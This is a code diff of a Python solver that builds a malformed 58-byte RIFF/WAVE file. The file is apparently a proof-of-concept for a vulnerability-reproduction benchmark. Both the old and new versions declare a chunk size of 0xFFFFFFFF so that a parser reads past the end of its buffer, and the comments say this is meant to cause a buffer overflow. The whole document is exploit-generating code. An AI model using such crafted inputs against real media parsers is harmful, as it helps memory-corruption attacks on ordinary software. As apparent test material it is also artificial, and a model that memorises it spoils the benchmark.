@@ -1,58 +1,46 @@
-import os
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
+        # Create a RIFF file with malformed chunk size to cause buffer overflow
+        # RIFF header: 'RIFF' + total_size + 'WAVE'
+        # Then a chunk with invalid size that extends beyond file boundary
+        
+        # Total file size will be 58 bytes (ground truth length)
+        # We'll create a 'fmt ' chunk with size larger than remaining data
+        
         # RIFF header (12 bytes)
-        # 4 bytes: 'RIFF'
-        # 4 bytes: file size minus 8 (little-endian)
-        # 4 bytes: 'WAVE' format
-        
-        # Chunk structure for vulnerability:
-        # 4 bytes: chunk ID ('data' in this case)
-        # 4 bytes: chunk size (little-endian)
-        # chunk data
-        
-        # Create a malformed WAV/RIFF file where chunk size exceeds actual data
-        
         riff_header = b'RIFF'
-        file_size = 50  # Total file size minus 8 = 58 - 8 = 50
-        format_type = b'WAVE'
+        # Total size: 58 - 8 = 50 (minus 8 for 'RIFF' and size field)
+        total_size = 50
+        riff_header += struct.pack('<I', total_size)
+        riff_header += b'WAVE'
         
-        # 'fmt ' chunk (24 bytes)
+        # 'fmt ' chunk header (8 bytes)
         fmt_chunk = b'fmt '
-        fmt_size = 16  # PCM format chunk size
-        audio_format = 1  # PCM
-        num_channels = 1
-        sample_rate = 8000
-        byte_rate = 16000
-        block_align = 2
-        bits_per_sample = 16
+        # Malformed size: larger than remaining data (58 - 12 - 8 = 38 bytes left)
+        # Set size to 0xFFFFFFFF to trigger maximum overflow
+        fmt_size = 0xFFFFFFFF  # Will cause buffer overflow
+        fmt_chunk += struct.pack('<I', fmt_size)
         
-        # 'data' chunk - vulnerable chunk
+        # Some PCM format data (minimal, 16 bytes)
+        # wFormatTag, nChannels, nSamplesPerSec, nAvgBytesPerSec, nBlockAlign, wBitsPerSample
+        fmt_data = struct.pack('<HHIIHH', 1, 2, 44100, 176400, 4, 16)
+        
+        # Pad with zeros to reach 58 bytes total
+        # 12 + 8 + 16 = 36 bytes so far
+        # Need 22 more bytes (58 - 36 = 22)
+        # But we declared fmt_size as 0xFFFFFFFF, so parser will try to read far beyond
+        # Add some data chunk to complete file structure
         data_chunk = b'data'
-        # Set chunk size larger than actual remaining data to cause overflow
-        # File is 58 bytes total, we've used 44 bytes so far, only 14 bytes remain
-        # But we set chunk size to 0xFFFFFFFF to trigger maximum overflow
-        chunk_size = 0xFFFFFFFF
+        # data_size = remaining bytes: 58 - 12 - 8 - 16 - 8 = 14
+        data_size = 14
+        data_chunk += struct.pack('<I', data_size)
         
-        # Construct the file
-        poc = (
-            riff_header + 
-            file_size.to_bytes(4, 'little') + 
-            format_type +
-            
-            fmt_chunk +
-            fmt_size.to_bytes(4, 'little') +
-            audio_format.to_bytes(2, 'little') +
-            num_channels.to_bytes(2, 'little') +
-            sample_rate.to_bytes(4, 'little') +
-            byte_rate.to_bytes(4, 'little') +
-            block_align.to_bytes(2, 'little') +
-            bits_per_sample.to_bytes(2, 'little') +
-            
-            data_chunk +
-            chunk_size.to_bytes(4, 'little') +
-            b'A' * 10  # Only 10 bytes of actual data, but chunk claims 0xFFFFFFFF bytes
-        )
+        # Add some sample data (zeros) - 14 bytes
+        sample_data = b'\x00' * data_size
+        
+        # Combine all parts
+        poc = riff_header + fmt_chunk + fmt_data + data_chunk + sample_data
         
         return poc
